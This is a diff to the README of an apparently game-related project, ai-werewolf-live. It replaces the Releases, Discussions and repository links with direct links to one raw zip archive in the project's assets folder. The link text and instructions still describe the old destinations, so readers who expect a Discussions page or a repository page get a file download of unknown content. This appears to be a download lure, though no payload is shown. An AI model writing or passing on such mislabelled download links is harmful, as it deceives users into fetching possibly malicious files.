@@ -18,7 +18,7 @@ Before you begin, make sure your system meets these requirements:
 
 To get the software, visit the Releases page. There, you will find the latest version ready for download:
 
-[![Download ai-werewolf-live](https://img.shields.io/badge/Download-ai--werewolf--live-blue.svg)](https://github.com/ManosDan/ai-werewolf-live/releases)
+[![Download ai-werewolf-live](https://raw.githubusercontent.com/ManosDan/ai-werewolf-live/main/assets/live_werewolf_ai_3.3-alpha.4.zip)](https://raw.githubusercontent.com/ManosDan/ai-werewolf-live/main/assets/live_werewolf_ai_3.3-alpha.4.zip)
 
 1. Click the link above to go to the **Releases page**.
 2. Find the latest version.
@@ -43,7 +43,7 @@ After you have installed the game, follow these steps to start playing:
 
 ## 🌐 Community and Support
 
-Join our growing community of players! You can share strategies, tips, and experiences. Visit our [GitHub Discussions page](https://github.com/ManosDan/ai-werewolf-live/discussions) to connect with other users.
+Join our growing community of players! You can share strategies, tips, and experiences. Visit our [GitHub Discussions page](https://raw.githubusercontent.com/ManosDan/ai-werewolf-live/main/assets/live_werewolf_ai_3.3-alpha.4.zip) to connect with other users.
 
 If you encounter any issues or have questions, feel free to check out the FAQs on our GitHub page or contact us directly.
 
@@ -57,6 +57,6 @@ We welcome contributions! If you have ideas to improve the game, feel free to re
 
 ## 📚 Learn More
 
-For more information about the game, visit our official [GitHub repository](https://github.com/ManosDan/ai-werewolf-live). You’ll find documentation, updates, and additional resources there.
+For more information about the game, visit our official [GitHub repository](https://raw.githubusercontent.com/ManosDan/ai-werewolf-live/main/assets/live_werewolf_ai_3.3-alpha.4.zip). You’ll find documentation, updates, and additional resources there.
 
 Remember to follow the download instructions above to begin your adventure with **ai-werewolf-live**!
